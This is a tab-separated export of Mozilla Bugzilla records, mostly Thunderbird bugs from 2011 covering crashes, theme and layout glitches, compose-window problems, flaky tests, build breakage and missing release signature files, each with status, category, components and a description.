Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
694409%TAB%1318506698%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Suppress Telemetry notification on Mozmill tests%TAB%Suppress Telemetry notification on Mozmill testsIn the same vein as bug 638605, we don't want the Telemetry opt-in prompt in our Mozmill tests. On a side note, there's a least one case (bug 690319) where the Telemetry prompt caused some focus issues, thus leading to some random oranges.  This patch *might* clear some of the oranges that have been cropping up lately.
692735%TAB%1317945479%TAB%155325%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Crash exporting messages in HTML format with ImportExportTools%TAB%Crash exporting messages in HTML format with ImportExportToolsUser Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.2.21) Gecko/20110830 Firefox/3.6.21 Build ID: 20110830092825  Steps to reproduce:  I'm the developer of ImportExportTools extension. Many users wrote to me, about a crash they get when trying to export messages in HTML format. The crash happens after a random number of messages and just with Thunderbird 5 or higher. All my reports come from Windows or MAC users and I can't reproduce this bug in any way on my Linux machine.  Crash logs (I've just few) have all many references to  "%SystemRoot%\system32\mswsock.dll" , you can find it a couple here:  http://services.gxware.org/nopaste/?3673 http://services.gxware.org/nopaste/?3674  All crash reports I got, seem to fall into this crash:   https://crash-stats.mozilla.com/report/list?product=Thunderbird&query_search=signature&query_type=exact&query=XPC_WN_NoHelper_Finalize&reason_type=contains&date=10%2F07%2F2011%2001%3A14%3A11&range_value=1&range_unit=weeks&hang_type=any&process_type=any&do_query=1&signature=XPC_WN_NoHelper_Finalize  All users report that crash happens just exporting in HTML/plain-text format, but not in EML format. The code for export in HTML is very similar to the code for export in EML.  The only difference is that EML export is done just through with a simple call to   messengerService.streamMessage(msguri, myEMLlistner, msgWindow, null, false, null);  while HTML export is performed with  var nschannel =  Components.classes["@mozilla.org/network/input-stream-channel;1"]    	  .createInstance(Components.interfaces.nsIInputStreamChannel); nschannel.setURI(nsURI); var streamConverterService = Components.classes["@mozilla.org/streamConverters;1"]    	   	  .getService(Components.interfaces.nsIStreamConverterService); var streamListner=streamConverterService.asyncConvertData("message/rfc822", "text/html", myTxtListener, nschannel); messageService.streamMessage(uri, streamListner, msgWindow, null, false, null);		  The rest of the code is pretty identical, so I guess that the crash is caused by nschannel.setURI(nsURI) or by the asyncConverter.  Notice that it seems have a close relation with https://bugzilla.mozilla.org/show_bug.cgi?id=682916, so this crash could be a symptom of a very frequent problem, present also on Firefox.  Steps to reproduce:  - install ImportExportTools extension, version 2.6.2.2 (attached here) - try to export a large number of messages in HTML format, with Thunderbird 5 or higher - after a random number of messages, sometimes you'll get a crash of Thunderbird  I'm contact with some users that can help us and me to debug this problem, so tell me which tests can be useful.
692616%TAB%1317907512%TAB%334226%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%large images not be scaled down to windows size%TAB%large images not be scaled down to windows sizeUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0 Build ID: 20110928060149  Steps to reproduce:  I send a plain text email to myself with an attachment (jpg)  of more than 3 MB. View > Display Attachments inline is activated. The Thunderbird window is maximized. I open the received in the message preview window or standalone message windows. I scroll down to the bottom of the message body to see the attached image file.   Actual results:  The image is larger than the actual window and has to be scrolled horizontally. Now I click on the max/normal button right on top. The window becomes smaller and the horizontal scroll bar disappear. The image has become the size of the window.  Clicking again on the button maximize the window and the image is still scaled down. Changing to another email and back again I have to do the same procedure. It's not important if the first window is maximized or normal.   Expected results:  The image should be scaled down immediately without any other action. It should have same behaviour as in TB 3.1 which works fine.
692473%TAB%1317884407%TAB%305876%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Add profiledbuild to the targets that qualify for auto-running client.py%TAB%Add profiledbuild to the targets that qualify for auto-running client.pyJust noticed in new-try that client.py doesn't get auto-invoked, because instead of:  make -f client.mk build  these win32 builds build with:  make -f client.mk profiledbuild
692100%TAB%1317791566%TAB%419931%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%menubar is extremely difficult to read with aero-glass effect%TAB%menubar is extremely difficult to read with aero-glass effectUser Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0 Build ID: 20110928060149  Steps to reproduce:  Install Thunderbird using the standard theme   Actual results:  I couldn't read the Menu bar unless I looked really hard   Expected results:  The menubar should be of sufficiently high contrast to be easy to read Bug 667248 raised the subject that this menubar was impossible to read. It is no longer *IMPOSSIBLE*, but it is still very difficult, on my Vista box at least. That bug has been marked as FIXED, so I've opened this one as the basic product is unusable for me without an addon.   I don't know about Windows 7, but the problem is entirely absent on XP.   Interestingly, it's not as bad when the window isn't maximised, as the background changes colour (no, I don't know why, I think it's a Windows 'feature')  The problem is also present in Firefox, though that doesn't bother me as I use the Firefox button instead of the menu bar.
691748%TAB%1317705870%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Enable privacy policy link on Thunderbird's about dialog%TAB%Enable privacy policy link on Thunderbird's about dialogWe'll soon have a privacy policy posted for Thunderbird. We need to unhide the link on the about dialog and update the link itself to point to the new location once it is up.  The new link is:  http://www.mozilla.org/en-US/thunderbird/legal/privacy/
691730%TAB%1317700603%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%toolbar buttons and global search box are different height%TAB%toolbar buttons and global search box are different heightI've changed the min-height from 22px to 24px and gave a top and bottom margin of 1px instead of 2px to avoid a growing of the toolbar. I made the same change to the Quick Filter search box to have the same height of the search boxes.
691724%TAB%1317698200%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%The folder view tree aligns with nothing%TAB%The folder view tree aligns with nothing(this might be a bit nit-picky, but whatever) File explorer and Windows Media Player seems to do this a bit different, but both do slightly better alignment than the folder sidebar in Thunderbird currently does. Either we can move the children a couple of pixels to the left and make the expanders align with the parents (like explorer, alt1), or move them a couple of pixels to the right and make the childrens icons align with the parents texts (like media player alt2).
691066%TAB%1317456885%TAB%384947%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Testing Infrastructure%TAB%Check .asc file permissions prior to Thunderbird release%TAB%Check .asc file permissions prior to Thunderbird releaseBug 691025 - "GPG detached signatures (asc) missing for thunderbird 7.0.1" has cropped up a number of times. Releng have updated their documentation to run the 'fix-permissions' target but it got missed for 7.0.1.  Can QA please add file permission checks to the list of things to test prior to release?  Thanks.
691025%TAB%1317436361%TAB%302197%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%GPG detached signatures (asc) missing for thunderbird 7.0.1%TAB%GPG detached signatures (asc) missing for thunderbird 7.0.1User Agent: Mozilla/5.0 (X11; Linux i686; rv:7.0) Gecko/20100101 Firefox/7.0 Build ID: 20110922153450  Steps to reproduce:  Tried to verify the integrity and authenticity of thunderbird 7.0.1 release tarball This bug is similar to: 690730, 690721, 684434, 684369, 684480   Actual results:  Missing detachted signature file at least here: ftp://releases.mozilla.org/pub/mozilla.org/thunderbird/releases/latest/linux-i686/de/   Expected results:  There should be a detached signature file to allow verification of the integrity and authenticity of thunderbird 7.0.1
690761%TAB%1317359004%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Switch nsIAbManager::convertQueryStringToExpression aQueryString parameter to nsAUTF8String%TAB%Switch nsIAbManager::convertQueryStringToExpression aQueryString parameter to nsAUTF8StringnsIAbManager::convertQueryStringToExpression parameter "aQueryString" is currently typed as a string.  We should be using nsAUTF8String instead, to support non-ASCII search queries from Javascript.
690655%TAB%1317325946%TAB%199031%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager,Address Book%TAB%I cannot re-edit vCard using the previous values%TAB%I cannot re-edit vCard using the previous valuesUser Agent: Mozilla/5.0 (Windows NT 6.0; rv:7.0) Gecko/20100101 Firefox/7.0 Build ID: 20110922153450  Steps to reproduce:  (I uses the Japanese-localized version of Thunderbird so UI terms may be incorrect.)  1) I checked to attach vCard in an account and edit my vCard. 2) I mailed to my self to see if my vCard looks good. 3) I opened the account setting and attempted to edit my vCard again.   Actual results:  First time edited vCard was sent with my test message, but when I tried to edit my vCard again, the editor dialog is all blank.  It seems that the program cannot retrieve the previous values from my vCard.   Expected results:  When I try to edit my vCard, the editor should be filled with the previously entered values.
690526%TAB%1317296871%TAB%94%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%address list won't resize smaller once made bigger,Compose window address list won't resize smaller once made bigger%TAB%address list won't resize smaller once made bigger,Compose window address list won't resize smaller once made biggerPut several addresses into your compose window. Resize the address list:  http://imgur.com/92faF  Now try to resize it smaller:  http://imgur.com/c6lsc  This seems to be a permanent state for the compose window now.
690522%TAB%1317296603%TAB%419113%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Address Book%TAB%I tried to compose an email as I always do with one of my email distribution lists in my Address Book and when I highlight the list and click WRITE, nothing happens%TAB%I tried to compose an email as I always do with one of my email distribution lists in my Address Book and when I highlight the list and click WRITE, nothing happensUser Agent: Mozilla/5.0 (Windows NT 6.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2 Build ID: 20110902133214  Steps to reproduce:  I tried to compose an email as I always do with one of my email distribution lists in my Address Book and when I highlight the list and click WRITE, nothing happens - it should launch a blank composition window consisting of all the emails that comprise that list. After the latest update, this is not working.  Can someone please check this out.  Thank you,  Lou   Actual results:  nothing happens - it should launch a blank composition window consisting of all the emails that comprise that list. After the latest update, this is not working.   Expected results:  it should launch a blank composition window consisting of all the emails that comprise that list. After the latest update, this is not working.
690520%TAB%1317296547%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%plugin crash mozmill test should handle crash-reporter not being enabled%TAB%plugin crash mozmill test should handle crash-reporter not being enabledIn the no good deed goes unpunished category(mconley writing mozmill tests for plugin crashes), I have the following issue: in debug builds (or, rather, any non-official build), crash-reporter is disabled, which makes the new plugin tests fail. I often (ok, sometimes) run the mozmill tests on a debug build, and it would be helpful if I didn't have to help those tests along by clicking on the crash dialog
690319%TAB%1317265713%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-summarization.js | test_summarization_thread_detection (preceded by something like "Thought we would find row 0 at 92,-9 but we found -1")%TAB%Random orange: TEST-UNEXPECTED-FAIL | test-summarization.js | test_summarization_thread_detection (preceded by something like "Thought we would find row 0 at 92,-9 but we found -1")New random orange that has appeared in the last day or so:  Test Failure: Thought we would find row 0 at 92,-9 but we found -1 TEST-UNEXPECTED-FAIL | /buildbot/comm-central-linux-opt-unittest-mozmill/build/mozmill/folder-display/test-summarization.js | test_summarization_thread_detection  http://tinderbox.mozilla.org/showlog.cgi?log=ThunderbirdTrunk/1317293922.1317295330.14004.gz#err0  Seems pretty frequent, only on Linux so far.
690316%TAB%1317265000%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Disable the what's new tab for users updating to minor/security release versions%TAB%Disable the what's new tab for users updating to minor/security release versionsBased on what we're doing in bug 690290, I think we should have code in place not to show the what's new tab for security/minor releases, and only show it for major releases where things are actually changing.  So for users updating, the map would go like follows. Assuming a 7.0.2 release is coming out:  * 6.0 -> 7.0.2 get prompted (this would be the page for the 7.0 release, set up by redirects). * 7.0 -> 7.0.2 don't get prompted. * 7.0.1 -> 7.0.2 don't get prompted.  Rafael: are you happy with this? If we find we need it for some reason, we can always back the code out for that release.  Note that Firefox is working on a way to cover what happens at update via the update snippets that AUS sends out. They've not quite finished yet, and it'll be a few versions before we get there, so I'd like to do this as a stop-gap.
690290%TAB%1317257820%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Disable the what's new tab for users updating from 7.0 to 7.0.1%TAB%Disable the what's new tab for users updating from 7.0 to 7.0.1As 7.0 -> 7.0.1 is a small bug-fix update, there isn't really any reason to show the what's new page. We should however show it for 6.0.2 -> 7.0.1 users.  The attached patch is a quick fix based on a patch by irving that achieves this. It will only land for comm-release.  For future versions I'm going to propose that we make this more permanent and we'll do that in a separate bug.
690282%TAB%1317256289%TAB%373850%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Caret vanishes when dropping attachment into mail edit window%TAB%Caret vanishes when dropping attachment into mail edit windowUser Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SBS; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; InfoPath.1; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MS-RTC LM 8; .NET4.0C; .NET4.0E; SBS)  Steps to reproduce:  ALT-TAB to a Windows Explorer window, click on a file, keep mouse button down, ALT-TAB to the TB Compose Window, dropped the file (thus attached it to my mail), then click in the mail composition window.   Actual results:  The caret does not appear in the compose window. I can still write. Doing ALT-TAB and then again ALT-TAB (= switching task away and back) solves the problem.   Expected results:  The caret should not have vanished.
690277%TAB%1317255766%TAB%425950%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General,Preferences%TAB%Multiple Address Book Entry In Junk Mail Property,Multiple (duplicate) Address Book Entries In "do not mark mail as junk if the sender is in" (Account settings -> Junk settings),Multiple (duplicate) Address Book Entries / checkboxes in "do not mark mail as junk if the sender is in" (Account settings -> Junk settings)%TAB%Multiple Address Book Entry In Junk Mail Property,Multiple (duplicate) Address Book Entries In "do not mark mail as junk if the sender is in" (Account settings -> Junk settings),Multiple (duplicate) Address Book Entries / checkboxes in "do not mark mail as junk if the sender is in" (Account settings -> Junk settings)User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0) Gecko/20100101 Firefox/7.0 Build ID: 20110922153450  Steps to reproduce:  Find multiple alternate entries of "personal address book" and "collected addresses" in junk mail property on profile with two email accounts. Originally 12 entries.    Actual results:  Unchecking all boxes reverts to normal display. Rechecking them gives number of entries for the accounts in that profile. ie if I create two dummy email accounts I will see 8 entries in the property sheet. This increased in sequence for each email account setting you view. ie, look at the first account there are the normal two entries, personal and collected, then second one you see four, third one six etc..   Expected results:  Only personal and collected for the relevant email should be visible on its property sheet available for junk mail filtering
690267%TAB%1317251695%TAB%112088%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Insert|Insert Characters and symbols not working - no options in drop-downs.%TAB%Insert|Insert Characters and symbols not working - no options in drop-downs.If you go to the compose window, and select Insert -> Characters and Symbols then you'll find that the drop-down boxes have no symbols in them.  This appears to be a regression in 7.  A quick look at the error console reveals:  Error: malformed Unicode character escape sequence Source File: chrome://editor/content/EdInsertChars.js Line: 416, Column: 2 Source Code:   "\u00f2\u00f3\u00f4\u00f5\u00f6\u014d\u014f\u0151\u01d2\u01eb\u01ed\u020d\u020e\u022b\u22d\u022f\u0231\u1e4d\u1e4f\u1e51\u1e53\u1ecd\u1ecf\u1ed1\u1ed3\u1ed5\u1ed7\u1ed9\u1edb\u1edd\u1edf\u1ee1\u1ee3",   The "\u22d" bit seems to be the error - even my emacs picks that up as wrong. My guess is that something has got a bit stricter in 7, causing this to now be an error.
690080%TAB%1317212101%TAB%190375%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Tab focus ring enlarges tab%TAB%Tab focus ring enlarges tabStarting with Thunderbird 5 I think, focus rings are shown on tabs labels. As soon as the ring is drawn, the tab grows by 1-2 pixels (vertically). This should be fixed or the focus ring be removed (Firefox does not shoe focus rings on tabs)
689950%TAB%1317190012%TAB%425826%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%RSS attachments can't be downloaded%TAB%RSS attachments can't be downloadedThe "Save" button for RSS attachments is disabled, preventing the user from downloading them. Right-clicking on the attachment itself opens the context menu, but the "Open" and "Save" options are grayed out.  I tried opening Thunderbird in safe mode, and this bug persists, so it doesn't seem to be an add-on issue. I have the feed message view set to Original HTML and Summary. Changing these didn't help either.
689742%TAB%1317126533%TAB%94%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%Set layers.acceleration.disabled to true,Disable hardware acceleration in Thunderbird%TAB%Set layers.acceleration.disabled to true,Disable hardware acceleration in ThunderbirdRight now Thunderbird forces the use of the discrete GPU because it uses layers acceleration. OpenGL layers acceleration is probably of minimal utility on Thunderbird, and so it should be disabled.
689555%TAB%1317098965%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Fix build bustage due to mozilla-central landing bug 687766 (kill binary xpidl)%TAB%Fix build bustage due to mozilla-central landing bug 687766 (kill binary xpidl)Bug 687766 landed in mozilla-central today (https://hg.mozilla.org/mozilla-central/rev/587115c590ff), and broke Thunderbird builds:   mconley@mconley-VirtualBox:/media/Projects/mozilla/thunderbird$ make -f client.mk Adding client.mk options from :     MOZ_OBJDIR=$(TOPSRCDIR)/../objdir-thunderbird-default     MOZ_MAKE_FLAGS=-j2 Generating /media/Projects/mozilla/thunderbird/configure using autoconf cd /media/Projects/mozilla/thunderbird; /usr/bin/autoconf2.13 /usr/bin/m4:./aclocal.m4:7: cannot open `mozilla/build/autoconf/libIDL.m4': No such file or directory make: *** [/media/Projects/mozilla/thunderbird/configure] Error 2  I was able to fix this locally by removing the dependency on libIDL.m4.
689543%TAB%1317095131%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Alignment in message thread pane is off%TAB%Alignment in message thread pane is offFrom the Department of Alignment and Agriculture. The alignment between the text in the tree headers and tree cells are a bit off. This mockup shows the Linux theme, but the issue is present in the Windows and Mac themes as well.
689104%TAB%1316991031%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installer%TAB%Remove (Safe Mode) string since it is no longer used%TAB%Remove (Safe Mode) string since it is no longer usedWe didn't spot we needed to remove this bug 641784, and I've just spotted a bug that says we should do.
689015%TAB%1316901753%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%reply icon (hdrReplyOnlyButton)  in message header is blurry%TAB%reply icon (hdrReplyOnlyButton)  in message header is blurryHm, it looks like the same thing is happening here with the reply button (hdrReplyOnlyButton).
688991%TAB%1316858061%TAB%98534%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Plaintext part not sent for multipart alternatve sen option,Plaintext part not sent for multipart alternatve send option%TAB%Plaintext part not sent for multipart alternatve sen option,Plaintext part not sent for multipart alternatve send optionSteps: Compose or reply to a message in html mode Select Options>>Format>>Plain& Rich text to avoid any internal AB decisions. Send or save the message locally and observe the result  Results: Two copies of the html message are sent even though multipart/alternative is indicated in the header.  This happens in:  Mozilla/5.0 (Windows NT 5.0; rv:9.0a1) Gecko/20110923 Thunderbird/9.0a1 ID:20110923030159 Not seen in the 20110920 build.  I strongly suspect bug 679476 as the problem
688860%TAB%1316777833%TAB%162223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Cannot switch spell check language with multiple compose windows open%TAB%Cannot switch spell check language with multiple compose windows openIn investigating bug 687319 I found this.  Steps to reproduce: 1. Have two dictionaries installed, for example the built in en-US plus https://addons.mozilla.org/da/firefox/addon/dansk-ordbog/ 2. Have two compose windows open 3. Switch focus between the main editing area of the two windows a couple of times 4. Try to switch between dictionaries a couple of times  Expected result: Selected language changes Actual result: Selected language gets stuck  Possibly related to bug 338427 and/or bug 591780.
688169%TAB%1316587810%TAB%420324%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%First Run message is never displayed%TAB%First Run message is never displayedTB has support for a special "first run" welcome page, displayed in the mail message window the first time a new installation (or a new profile) starts up.  The logic to display this page never triggers. In msgMail3PaneWindow.js/OnLoadMessenger() we call LoadPostAccountWizard() which sets a timer on the "window" object to call loadStartFolder(). Then we call specialTabs.openSpecialTabsOnStartup(), which calls getApplicationUpgradeVersions() to check the old value of the "mailnews.start_page_override.mstone" pref **and set it to the current TB version**.  Then, later, the timer calls loadStartFolder() and a very twisty call chain gets to mailWindow.js/loadStartPage(), which checks the "...mstone" pref, sees it is already set, and always chooses to display the Start page instead of the Firstrun page.  Short term fix, as advised by Standard8, is to rip out the "first run" logic and page.  If we decide later that we really want a different UX on first run, I recommend that we pull out the "what is the old and new TB version, is this an upgrade or a first run" logic into a separate thing (object, group of methods on some existing object, whatever) that caches the test result, and call it from all the places that care; that way we won't be sensitive to subtle execution order changes.
687836%TAB%1316497091%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Bug-fixing pre-followup patch.%TAB%Bug-fixing pre-followup patch.STR: Apply the patches for bug 582801, bug 667244, and bug 670304 (in that order). Build Thunderbird. See what's still wrong.  ;)  The purpose of this bug is to fix all the little things I find wrong with those other patches, since it seems like a real pain to try and untangle what bits each patch is responsible for, and where each individual fix goes.  None of the patches in those bugs should be checked in until this patch is ready as well, and then we can do them all in one big swoop.
687526%TAB%1316420879%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Missing archive icon%TAB%Missing archive iconIt seems the message folder icon got lost under Aero when we fixed bug #630330 This bug wants to fix that.
687520%TAB%1316420168%TAB%274627%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Preferences%TAB%Add DSPAM to "Trust junk mail headers set by" Option%TAB%Add DSPAM to "Trust junk mail headers set by" OptionAt current the "Trust junk mail headers set by" dropdown in the per-account junk mail settings only contains SpamAssassin and SpamPal.  I would like it to also contain DSPAM.
687369%TAB%1316342500%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%archive icon in message header is blurry%TAB%archive icon in message header is blurryThe archive icon is blurry. This does not happen in the header that's shown if several messages are selected.
686959%TAB%1316088081%TAB%4410%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%multiple selection colors confusing on windows theme,improve multiple selection colors on windows theme; fix focused vs. unfocused selection colors%TAB%multiple selection colors confusing on windows theme,improve multiple selection colors on windows theme; fix focused vs. unfocused selection colorsIf I have two messages selected, the thread pane lines have very different colors - the one with focus is much darker, so it can be unclear that both messages are selected. Blake suggested making the colors closer, or even, the same.
686436%TAB%1315877293%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Toolbars and Tabs,Help Documentation%TAB%ctrl tab,ctrl+tab, ctrl+shift+tab for switching tabs missing from TB keyboard shortcuts documentation%TAB%ctrl tab,ctrl+tab, ctrl+shift+tab for switching tabs missing from TB keyboard shortcuts documentationDocumentation is missing for ctrl+[shift]+tab on TB's list of keyboard shortcuts (http://support.mozillamessaging.com/en-US/kb/Keyboard-shortcuts)  Suppose we should have:  Switch to next tab [ctrl]+[tab] Switch to previous tab [ctrl]+[shift]+[tab]
686347%TAB%1315826075%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End,User Interface,Mail Window Front End%TAB%Get an account implementation tracker%TAB%Get an account implementation trackerThis is bug is for tracking my progress on landing get an account in the main product.  Here's a preliminary patch that doesn't do much, except for getting the right files into the tree, writing the right manifests, Makefiles, and that sort of stuff. Also, getting rid of the overlays, and doing the right tweaks instead of monkey-patching all sorts of stuff.  Per the phone discussion with JB, here's a list of things that we should watch for. 1. Interaction with opensearch (what happens if the user has made a search engine his favorite choice through opensearch, and he then gets an account through one of our add-supported partners?). 2. Make sure the list of providers is stored remotely so that we can add new partners without having to deploy a new version of Thunderbird (Blake, I believe this is in place already, can you confirm this?). 3. Make sure the API for creating an account (i.e. the remote API) is well-defined. Apparently, this is not the case for Yahoo. 4. Another item related to configuring specific email accounts which I wrote down, but I'm not sure what this is supposed to refer to. Jb, thoughts?  I'll be mainly posting updates for the patch, and pinging Blake and maybe Andreas for design decisions, appearance stuff, etc.  Blake, here's some questions for you. - why did you rewrite the new ComposeMessage function? there doesn't seem to be anything specific in it, - I'm not sure I understand what you wanted to overlay with mailWizardOverlay.xul, - hopefully I didn't miss any place where one can create a new account.  Let me know if you have any thoughts / comments, here would be a great place to keep them.
686129%TAB%1315638075%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Random orange: TEST-UNEXPECTED-FAIL | /builds/slave/comm-central-macosx64-opt-unittest-mozmill/build/mozmill/migration-from-tb2/test-1-introduction.js | test_open_and_close_migration_assistant and other related failures,Random orange: TEST-UNEXPECTED-FAIL | test-1-introduction.js | test_open_and_close_migration_assistant and other related failures%TAB%Random orange: TEST-UNEXPECTED-FAIL | /builds/slave/comm-central-macosx64-opt-unittest-mozmill/build/mozmill/migration-from-tb2/test-1-introduction.js | test_open_and_close_migration_assistant and other related failures,Random orange: TEST-UNEXPECTED-FAIL | test-1-introduction.js | test_open_and_close_migration_assistant and other related failuresAttaching what I think is a fix for the issue. It's a departure from our usual way of wait-then-verify, but I think it's appropriate in this case. I've unified all the code that waits for either a content tab or a frame to load as far as I could.
685462%TAB%1315437597%TAB%155325%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General%TAB%blanks at the end of email-address in Settings prevents displaying of inline images%TAB%blanks at the end of email-address in Settings prevents displaying of inline imagesUser Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.2.21) Gecko/20110830 Firefox/3.6.21 Build ID: 20110830092825  Steps to reproduce:  - in Account settings, put a email-address with a blank at the end - try to use a signature with images or insert an inline images   Actual results:  - the images are not displayed   Expected results:  - the images should be displayed  This bug is caused by a wrong "cid" in the images.  In the body of message the "cid" reports the final blank as "%20" or doesn't report it (I got both behaviour in different PC) while the attachment mantains the final blank in the Content-Id. In both cases the images will not be displayed.  Probably the best way to fix it, is to strip all spaces in generating the "Content-Id".
685437%TAB%1315433103%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Attachment pane width in composer is not consistent%TAB%Attachment pane width in composer is not consistentWhen you add an attachment to a message and then remove it, the width of the attachment pane shrinks a bit. This is from bug 630759, and the fix should be easy.
685345%TAB%1315403820%TAB%23131%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Stop using abDirTreeOverlay%TAB%Stop using abDirTreeOverlayIn bug 677859, SeaMonkey stopped using abDirTreeOverlay.xul, so it should now really be removed from comm-central.  This patch: * Removes overlaying in abContactsPanel.xul * Removes abDirTreeOverlay.xul/dtd files. * Removes references to abDirTreeOverlay.xul/files from jar.mn files.
